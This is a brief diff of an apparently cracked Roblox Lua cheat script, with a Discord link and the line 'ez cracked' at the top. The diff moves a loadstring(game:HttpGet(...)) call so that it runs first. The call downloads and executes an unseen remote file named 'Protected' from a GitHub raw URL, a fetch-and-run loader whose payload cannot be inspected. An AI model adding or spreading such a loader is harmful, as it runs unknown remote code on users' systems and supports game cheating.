@@ -1,5 +1,7 @@
 -- https://discord.gg/UgQAPcBtpy
 
+task.wait(0.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aa8283/i/refs/heads/main/Protected_2547730226887233.txt"))() 
 print("ez cracked")
 
 local Player = game.Players.LocalPlayer
@@ -250,6 +252,3 @@ UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
         end
     end
 end)
-
-task.wait(0.5)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/aa8283/i/refs/heads/main/Protected_2547730226887233.txt"))() 
